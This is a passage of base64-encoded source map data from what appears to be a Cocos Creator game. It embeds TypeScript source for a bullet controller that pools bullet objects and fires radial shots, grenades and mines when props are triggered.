SxDQUFDLEVBQUUsRUFBRSxDQUFDLFFBQVEsQ0FBQztvQ0FDOUQsTUFBTSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO2dDQUMvQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7NEJBQ1QsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO3dCQUNULENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQzs7O29CQWpCVCxLQUFLLElBQUksQ0FBQyxHQUFDLENBQUMsRUFBRSxDQUFDLEdBQUMsR0FBRyxFQUFFLENBQUMsRUFBRTtnQ0FBZixDQUFDO3FCQWtCVDtpQkFDSjtnQkFDRCxNQUFNO1lBQ1YsS0FBSyxDQUFDO2dCQUNGO29CQUNJLGVBQWU7b0JBQ2YsSUFBSSxNQUFNLEdBQXdCLElBQUksQ0FBQyxxQkFBcUIsQ0FBQyxDQUFDLENBQUMsQ0FBQztvQkFDaEUsTUFBTSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUM7b0JBQzFDLE1BQU0sQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztvQkFDMUIsTUFBTSxDQUFDLE9BQU8sRUFBRSxDQUFDO2lCQUNwQjtnQkFDRCxNQUFNO1lBQ1YsS0FBSyxDQUFDO2dCQUNGO29CQUNJLGdCQUFnQjtvQkFDaEIsSUFBSSxJQUFJLEdBQUcsTUFBTSxDQUFDLHNCQUFzQixDQUFDLENBQUMsd0JBQXdCLEVBQUUsQ0FBQztvQkFDckUsaUNBQWlDO29CQUNqQyxJQUFJLElBQUksQ0FBQyxNQUFNLEdBQUcsQ0FBQyxFQUFDO3dCQUNoQixJQUFJLGFBQVcsR0FBRyxDQUFDLENBQUMsQ0FBQzt3QkFDckIsSUFBSSxPQUFLLEdBQUcsSUFBSSxDQUFDO3dCQUNqQixJQUFJLENBQUMsT0FBTyxDQUFDLFVBQUEsS0FBSzs0QkFDZCxJQUFJLFFBQVEsR0FBRyxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxHQUFHLENBQUMsS0FBSyxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsQ0FBQyxHQUFHLEVBQUUsQ0FBQzs0QkFDakUsSUFBSSxhQUFXLEdBQUcsQ0FBQyxJQUFJLFFBQVEsR0FBRyxhQUFXLEVBQUM7Z0NBQzFDLGFBQVcsR0FBRyxRQUFRLENBQUM7Z0NBQ3ZCLE9BQUssR0FBRyxLQUFLLENBQUM7NkJBQ2pCO3dCQUNMLENBQUMsQ0FBQyxDQUFDO3dCQUNILFdBQVc7d0JBQ1gsSUFBSSxNQUFNLEdBQXFCLElBQUksQ0FBQyxxQkFBcUIsQ0FBQyxDQUFDLENBQUMsQ0FBQzt3QkFDN0QsTUFBTSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUM7d0JBQzFDLE1BQU0sQ0FBQyxLQUFLLENBQUMsT0FBSyxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsQ0FBQztxQkFDckM7aUJBQ0o7Z0JBQ0QsTUFBTTtTQUNiO0lBQ0wsQ0FBQztJQXZTRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDOzhEQUNTO0lBRzNCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7b0VBQ2U7SUFHakM7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzttRUFDYztJQVRmLHFCQUFxQjtRQUR6QyxPQUFPO09BQ2EscUJBQXFCLENBNFN6QztJQUFELDRCQUFDO0NBNVNELEFBNFNDLENBNVNrRCxFQUFFLENBQUMsU0FBUyxHQTRTOUQ7a0JBNVNvQixxQkFBcUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEJ1bGxldFN0cmlrZSBmcm9tIFwiLi4vZW50aXRpZXMvYnVsbGV0U3RyaWtlL0J1bGxldFN0cmlrZVwiO1xyXG5pbXBvcnQgQnVsbGV0IGZyb20gXCIuLi9lbnRpdGllcy9idWxsZXQvQnVsbGV0XCI7XHJcbmltcG9ydCB7R2FtZVByb3h5fSBmcm9tIFwiLi9HYW1lUHJveHlcIjtcclxuaW1wb3J0IFByb3BCYXNlIGZyb20gXCIuLi9lbnRpdGllcy9wcm9wL1Byb3BCYXNlXCI7XHJcbmltcG9ydCBCdWxsZXRPZlNob3VMZWkgZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZlNob3VMZWlcIjtcclxuaW1wb3J0IEJ1bGxldE9mSmlhbkd1YW5nU2kgZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZkppYW5HdWFuZ1NpXCI7XHJcbmltcG9ydCBCdWxsZXRPZkxpZ2h0aW5nIGZyb20gXCIuLi9lbnRpdGllcy9idWxsZXQvQnVsbGV0T2ZMaWdodGluZ1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBHYW1lQnVsbGV0c0NvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgYnVsbGV0TGF5ZXI6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBidWxsZXRTdHJpa2VMYXllcjpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIGVuZW15QnVsbGV0TGF5ZXI6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgcHJpdmF0ZSBfYnVsbGV0TWFwID0gbmV3IE1hcDxudW1iZXIsIEFycmF5PEJ1bGxldD4+KCk7XHJcblxyXG4gICAgcHJpdmF0ZSBfYnVsbGV0U3RyaWtlTWFwID0gbmV3IE1hcDxudW1iZXIsIEFycmF5PEJ1bGxldFN0cmlrZT4+KCk7XHJcblxyXG4gICAgcHJpdmF0ZSBfZW5lbXlCdWxsZXRNYXAgPSBuZXcgTWFwPG51bWJlciwgQXJyYXk8QnVsbGV0Pj4oKTtcclxuICAgIHByaXZhdGUgX3Byb3BCdWxsZXRNYXAgPSBuZXcgTWFwPG51bWJlciwgQXJyYXk8QnVsbGV0Pj4oKTtcclxuXHJcbiAgICByb2xlQnVsbGV0czpBcnJheTxCdWxsZXQ+ID0gW107XHJcbiAgICBlbmVteUJ1bGxldHM6QXJyYXk8QnVsbGV0PiA9IFtdO1xyXG5cclxuXHJcbiAgICBwcml2YXRlIGdlbkJ1bGxldChpZDpudW1iZXIpOkJ1bGxldHtcclxuICAgICAgICBsZXQgcHJlZmFiUGF0aCA9ICdwcmVmYWIvZW50aXRpZXMvYnVsbGV0L2J1bGxldCcraWQ7XHJcbiAgICAgICAgbGV0IGVudGl0eVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMocHJlZmFiUGF0aCwgY2MuUHJlZmFiKTtcclxuICAgICAgICBsZXQgbm9kZSA9IGNjLmluc3RhbnRpYXRlKGVudGl0eVByZWZhYik7XHJcbiAgICAgICAgdGhpcy5idWxsZXRMYXllci5hZGRDaGlsZChub2RlKTtcclxuICAgICAgICBsZXQgYnVsbGV0ID0gPEJ1bGxldD5ub2RlLmdldENvbXBvbmVudChCdWxsZXQpO1xyXG4gICAgICAgIGJ1bGxldC5pbml0KGlkKTtcclxuICAgICAgICBsZXQgYXJyID0gdGhpcy5fYnVsbGV0TWFwLmdldChpZCk7XHJcbiAgICAgICAgaWYgKHR5cGVvZiBhcnIgPT0gXCJ1bmRlZmluZWRcIil7XHJcbiAgICAgICAgICAgIGFyciA9IFtdO1xyXG4gICAgICAgICAgICB0aGlzLl9idWxsZXRNYXAuc2V0KGlkLCBhcnIpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBhcnIucHVzaChidWxsZXQpO1xyXG4gICAgICAgIG5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgcmV0dXJuIGJ1bGxldDtcclxuICAgIH1cclxuXHJcbiAgICBnZXRJbmFjdGl2ZUJ1bGxldChpZDpudW1iZXIpOkJ1bGxldHtcclxuICAgICAgICBsZXQgcmVzdWx0OkJ1bGxldCA9IHVuZGVmaW5lZDtcclxuICAgICAgICBsZXQgYXJyID0gdGhpcy5fYnVsbGV0TWFwLmdldChpZCk7XHJcbiAgICAgICAgaWYgKHR5cGVvZiBhcnIgIT0gJ3VuZGVmaW5lZCcpe1xyXG4gICAgICAgICAgICByZXN1bHQgPSBhcnIuZmluZCh2YWx1ZSA9PiB2YWx1ZS5ub2RlLmFjdGl2ZSA9PSBmYWxzZSk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGlmICh0eXBlb2YgcmVzdWx0ID09IFwidW5kZWZpbmVkXCIpe1xyXG4gICAgICAgICAgICByZXN1bHQgPSB0aGlzLmdlbkJ1bGxldChpZCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHJldHVybiByZXN1bHQ7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHByaXZhdGUgZ2VuQnVsbGV0U3RyaWtlKGlkOm51bWJlcik6QnVsbGV0U3RyaWtle1xyXG4gICAgICAgIGxldCBwcmVmYWJQYXRoID0gJ3ByZWZhYi9lbnRpdGllcy9idWxsZXQvYnVsbGV0JytpZCArIFwiU3RyaWtlXCI7XHJcbiAgICAgICAgbGV0IGVudGl0eVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMocHJlZmFiUGF0aCwgY2MuUHJlZmFiKTtcclxuICAgICAgICBsZXQgbm9kZSA9IGNjLmluc3RhbnRpYXRlKGVudGl0eVByZWZhYik7XHJcbiAgICAgICAgdGhpcy5idWxsZXRTdHJpa2VMYXllci5hZGRDaGlsZChub2RlKTtcclxuICAgICAgICBsZXQgYnVsbGV0U3RyaWtlID0gPEJ1bGxldFN0cmlrZT5ub2RlLmdldENvbXBvbmVudChCdWxsZXRTdHJpa2UpO1xyXG4gICAgICAgIGJ1bGxldFN0cmlrZS5pbml0KGlkKTtcclxuICAgICAgICBsZXQgYXJyID0gdGhpcy5fYnVsbGV0U3RyaWtlTWFwLmdldChpZCk7XHJcbiAgICAgICAgaWYgKHR5cGVvZiBhcnIgPT0gXCJ1bmRlZmluZWRcIil7XHJcbiAgICAgICAgICAgIGFyciA9IFtdO1xyXG4gICAgICAgICAgICB0aGlzLl9idWxsZXRTdHJpa2VNYXAuc2V0KGlkLCBhcnIpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBhcnIucHVzaChidWxsZXRTdHJpa2UpO1xyXG4gICAgICAgIG5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgcmV0dXJuIGJ1bGxldFN0cmlrZTtcclxuICAgIH1cclxuXHJcbiAgICBnZXRJbmFjdGl2ZUJ1bGxldFN0cmlrZShpZDpudW1iZXIpOkJ1bGxldFN0cmlrZXtcclxuICAgICAgICBsZXQgcmVzdWx0OkJ1bGxldFN0cmlrZSA9IHVuZGVmaW5lZDtcclxuICAgICAgICBsZXQgYXJyID0gdGhpcy5fYnVsbGV0U3RyaWtlTWFwLmdldChpZCk7XHJcbiAgICAgICAgaWYgKHR5cGVvZiBhcnIgIT0gJ3VuZGVmaW5lZCcpe1xyXG4gICAgICAgICAgICByZXN1bHQgPSBhcnIuZmluZCh2YWx1ZSA9PiB2YWx1ZS5ub2RlLmFjdGl2ZSA9PSBmYWxzZSk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGlmICh0eXBlb2YgcmVzdWx0ID09IFwidW5kZWZpbmVkXCIpe1xyXG4gICAgICAgICAgICByZXN1bHQgPSB0aGlzLmdlbkJ1bGxldFN0cmlrZShpZCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHJldHVybiByZXN1bHQ7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHByaXZhdGUgZ2VuRW5lbXlCdWxsZXQoaWQ6bnVtYmVyKTpCdWxsZXR7XHJcbiAgICAgICAgbGV0IHByZWZhYlBhdGggPSAncHJlZmFiL2VudGl0aWVzL2J1bGxldC9lbmVteUJ1bGxldCcraWQ7XHJcbiAgICAgICAgbGV0IGVudGl0eVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMocHJlZmFiUGF0aCwgY2MuUHJlZmFiKTtcclxuICAgICAgICBsZXQgbm9kZSA9IGNjLmluc3RhbnRpYXRlKGVudGl0eVByZWZhYik7XHJcbiAgICAgICAgdGhpcy5lbmVteUJ1bGxldExheWVyLmFkZENoaWxkKG5vZGUpO1xyXG4gICAgICAgIGxldCBidWxsZXQgPSA8QnVsbGV0Pm5vZGUuZ2V0Q29tcG9uZW50KEJ1bGxldCk7XHJcbiAgICAgICAgYnVsbGV0LmluaXQoaWQpO1xyXG4gICAgICAgIGxldCBhcnIgPSB0aGlzLl9lbmVteUJ1bGxldE1hcC5nZXQoaWQpO1xyXG4gICAgICAgIGlmICh0eXBlb2YgYXJyID09IFwidW5kZWZpbmVkXCIpe1xyXG4gICAgICAgICAgICBhcnIgPSBbXTtcclxuICAgICAgICAgICAgdGhpcy5fZW5lbXlCdWxsZXRNYXAuc2V0KGlkLCBhcnIpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBhcnIucHVzaChidWxsZXQpO1xyXG4gICAgICAgIG5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgcmV0dXJuIGJ1bGxldDtcclxuICAgIH1cclxuXHJcbiAgICBnZXRJbmFjdGl2ZUVuZW15QnVsbGV0KGlkOm51bWJlcik6QnVsbGV0e1xyXG4gICAgICAgIGxldCByZXN1bHQ6QnVsbGV0ID0gdW5kZWZpbmVkO1xyXG4gICAgICAgIGxldCBhcnIgPSB0aGlzLl9lbmVteUJ1bGxldE1hcC5nZXQoaWQpO1xyXG4gICAgICAgIGlmICh0eXBlb2YgYXJyICE9ICd1bmRlZmluZWQnKXtcclxuICAgICAgICAgICAgcmVzdWx0ID0gYXJyLmZpbmQodmFsdWUgPT4gdmFsdWUubm9kZS5hY3RpdmUgPT0gZmFsc2UpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBpZiAodHlwZW9mIHJlc3VsdCA9PSBcInVuZGVmaW5lZFwiKXtcclxuICAgICAgICAgICAgcmVzdWx0ID0gdGhpcy5nZW5FbmVteUJ1bGxldChpZCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHJldHVybiByZXN1bHQ7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHByaXZhdGUgZ2VuUHJvcEJ1bGxldChpZDpudW1iZXIpOkJ1bGxldHtcclxuICAgICAgICBsZXQgcHJlZmFiUGF0aCA9ICdwcmVmYWIvZW50aXRpZXMvYnVsbGV0L3Byb3BCdWxsZXQnK2lkO1xyXG4gICAgICAgIGxldCBlbnRpdHlQcmVmYWIgPSBjYy5sb2FkZXIuZ2V0UmVzKHByZWZhYlBhdGgsIGNjLlByZWZhYik7XHJcbiAgICAgICAgbGV0IG5vZGUgPSBjYy5pbnN0YW50aWF0ZShlbnRpdHlQcmVmYWIpO1xyXG4gICAgICAgIHRoaXMuYnVsbGV0TGF5ZXIuYWRkQ2hpbGQobm9kZSk7XHJcbiAgICAgICAgbGV0IGJ1bGxldCA9IDxCdWxsZXQ+bm9kZS5nZXRDb21wb25lbnQoQnVsbGV0KTtcclxuICAgICAgICBidWxsZXQuaW5pdChpZCk7XHJcbiAgICAgICAgbGV0IGFyciA9IHRoaXMuX3Byb3BCdWxsZXRNYXAuZ2V0KGlkKTtcclxuICAgICAgICBpZiAodHlwZW9mIGFyciA9PSBcInVuZGVmaW5lZFwiKXtcclxuICAgICAgICAgICAgYXJyID0gW107XHJcbiAgICAgICAgICAgIHRoaXMuX3Byb3BCdWxsZXRNYXAuc2V0KGlkLCBhcnIpO1xyXG4gICAgICAgIH1cclxuICAgICAgICBhcnIucHVzaChidWxsZXQpO1xyXG4gICAgICAgIG5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgcmV0dXJuIGJ1bGxldDtcclxuICAgIH1cclxuXHJcbiAgICBnZXRJbmFjdGl2ZVByb3BCdWxsZXQoaWQ6bnVtYmVyKTpCdWxsZXR7XHJcbiAgICAgICAgbGV0IHJlc3VsdDpCdWxsZXQgPSB1bmRlZmluZWQ7XHJcbiAgICAgICAgbGV0IGFyciA9IHRoaXMuX3Byb3BCdWxsZXRNYXAuZ2V0KGlkKTtcclxuICAgICAgICBpZiAodHlwZW9mIGFyciAhPSAndW5kZWZpbmVkJyl7XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IGFyci5maW5kKHZhbHVlID0+IHZhbHVlLm5vZGUuYWN0aXZlID09IGZhbHNlKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgaWYgKHR5cGVvZiByZXN1bHQgPT0gXCJ1bmRlZmluZWRcIil7XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IHRoaXMuZ2VuUHJvcEJ1bGxldChpZCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHJldHVybiByZXN1bHQ7XHJcbiAgICB9XHJcblxyXG4gICAgb25Mb2FkKCl7XHJcbiAgICAgICAgdGhpcy5ub2RlLm9uKEdhbWVQcm94eS5FdmVudC5Qcm9wVHJpZ2dlciwgdGhpcy5vblByb3BUcmlnZ2VyLCB0aGlzKTtcclxuICAgICAgICB3aW5kb3dbJ0dhbWVCdWxsZXRzQ29udHJvbGxlciddID0gdGhpcztcclxuICAgIH1cclxuXHJcbiAgICBvbkRlc3Ryb3koKXtcclxuICAgICAgICB0aGlzLm5vZGUub2ZmKEdhbWVQcm94eS5FdmVudC5Qcm9wVHJpZ2dlciwgdGhpcy5vblByb3BUcmlnZ2VyLCB0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICBvblByb3BUcmlnZ2VyKHByb3A6UHJvcEJhc2Upe1xyXG4gICAgICAgIHN3aXRjaCAocHJvcC5wcm9wSUQpe1xyXG4gICAgICAgICAgICBjYXNlIDE6XHJcbiAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgLyoqIOS4pOS4quaWueWQkSAzNjDluqYg5LiA6YGN6L2s5ZyIIOS4gOmBjeW8gOeCriAqL1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBmaXJpbmdSYW5nZSA9IDUwMDtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgc3BlZWQgPSAxMDAwO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBidWxsZXREdXJhdGlvbiA9IGZpcmluZ1JhbmdlL3NwZWVkO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBkdXJhdGlvbiA9IDI7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IG51bSA9IDIwO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBvbmNlVGltZSA9IGR1cmF0aW9uL251bTtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgb25jZURlZ3JlZSA9IDM2MC9udW07XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IHN0YXJ0UG9zID0gY2MudjIocHJvcC5ub2RlLngsIHByb3Aubm9kZS55KTtcclxuICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaTxudW07IGkrKyl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKGkqb25jZVRpbWUpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgLyoqIOWPkeWwhOeBq+eCriAqL1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGJ1bGxldCA9IHRoaXMuZ2V0SW5hY3RpdmVQcm9wQnVsbGV0KDEpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLnJvdGF0aW9uID0gaSAqIG9uY2VEZWdyZWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlyID0gY2MudjIoMCwgMSkucm90YXRlU2VsZihjYy5taXNjLmRlZ3JlZXNUb1JhZGlhbnMoLWJ1bGxldC5ub2RlLnJvdGF0aW9uKSkubm9ybWFsaXplU2VsZigpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSBzdGFydFBvcy5hZGQoZGlyLm11bCg2MCkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLm1vdmVCeShidWxsZXREdXJhdGlvbiwgZGlyLm11bChmaXJpbmdSYW5nZSkpLmVhc2luZyhjYy5lYXNlU2luZU91dCgpKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKSk7XHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGJ1bGxldDIgPSB0aGlzLmdldEluYWN0aXZlUHJvcEJ1bGxldCgxKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldDIubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Mi5ub2RlLnJvdGF0aW9uID0gaSAqIG9uY2VEZWdyZWUgKyAxODA7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlyMiA9IGNjLnYyKDAsIDEpLnJvdGF0ZVNlbGYoY2MubWlzYy5kZWdyZWVzVG9SYWRpYW5zKC1idWxsZXQyLm5vZGUucm90YXRpb24pKS5ub3JtYWxpemVTZWxmKCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQyLm5vZGUucG9zaXRpb24gPSBzdGFydFBvcy5hZGQoZGlyMi5tdWwoNjApKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldDIubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MubW92ZUJ5KGJ1bGxldER1cmF0aW9uLCBkaXIyLm11bChmaXJpbmdSYW5nZSkpLmVhc2luZyhjYy5lYXNlU2luZU91dCgpKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQyLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICBjYXNlIDI6XHJcbiAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgLyoqIOWFqOaWueS9jeeCuOW8ue+8muS+neasoeW8ueWHujbpopfmiYvpm7fvvIjpobrml7bpkojvvIkg54K45by55ZCE5Liq5pa55ZCR5rua5YqoIOaSnuWIsOaAqueJqeWQjueIhueCuCAqL1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBudW0gPSA2O1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBvbmNlRGVncmVlID0gMzYwLzY7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IG9uY2VUaW1lID0gMC4wNTtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgbW92ZUxlbiA9IDEwMDtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgbW92ZVNwZWVkID0gMTAwMDtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgbW92ZUR1cmF0aW9uID0gbW92ZUxlbi9tb3ZlU3BlZWQ7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IHN0YXJ0UG9zID0gY2MudjIocHJvcC5ub2RlLngsIHByb3Aubm9kZS55KTtcclxuICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpPTA7IGk8bnVtOyBpKyspe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZShpKm9uY2VUaW1lKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBidWxsZXQgPSB0aGlzLmdldEluYWN0aXZlUHJvcEJ1bGxldCgyKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGVncmVlID0gMzArIGkgKiBvbmNlRGVncmVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucm90YXRpb24gPSBkZWdyZWUgLSA5MDtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBkaXIgPSBjYy52MigwLCAxKS5yb3RhdGVTZWxmKGNjLm1pc2MuZGVncmVlc1RvUmFkaWFucygtZGVncmVlKSkubm9ybWFsaXplU2VsZigpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSBzdGFydFBvcztcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLnNjYWxlID0gMDtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLnJ1bkFjdGlvbihjYy5zY2FsZVRvKG1vdmVEdXJhdGlvbiwgMSkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLm1vdmVCeShtb3ZlRHVyYXRpb24sIGRpci5tdWwobW92ZUxlbikpLCBjYy5kZWxheVRpbWUoKG51bS1pLTEpKm9uY2VUaW1lKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoPEJ1bGxldE9mU2hvdUxlaT5idWxsZXQpLm1vdmUoZGlyKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pKSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIGNhc2UgMzpcclxuICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAvKiog5Y+R5Ye6MTLkuKrlnLDpm7cg5oCq54mp6Lip5Yiw5bCx5Lya54iG54K4IOWcsOmbt+aMgee7rTIwUyAqL1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBudW0gPSA2O1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBvbmNlRGVncmVlID0gMzYwLzY7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IG9uY2VUaW1lID0gMC4wNTtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgbW92ZUxlbiA9IDgwO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBtb3ZlU3BlZWQgPSAxMDAwO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBtb3ZlRHVyYXRpb24gPSBtb3ZlTGVuL21vdmVTcGVlZDtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgdGltZSA9IDIwO1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBzdGFydFBvcyA9IGNjLnYyKHByb3Aubm9kZS54LCBwcm9wLm5vZGUueSk7XHJcbiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaT0wOyBpPG51bTsgaSsrKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoaSpvbmNlVGltZSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgYnVsbGV0ID0gdGhpcy5nZXRJbmFjdGl2ZVByb3BCdWxsZXQoMyk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRlZ3JlZSA9IDMwKyBpICogb25jZURlZ3JlZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLnJvdGF0aW9uID0gZGVncmVlIC0gOTA7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlyID0gY2MudjIoMCwgMSkucm90YXRlU2VsZihjYy5taXNjLmRlZ3JlZXNUb1JhZGlhbnMoLWRlZ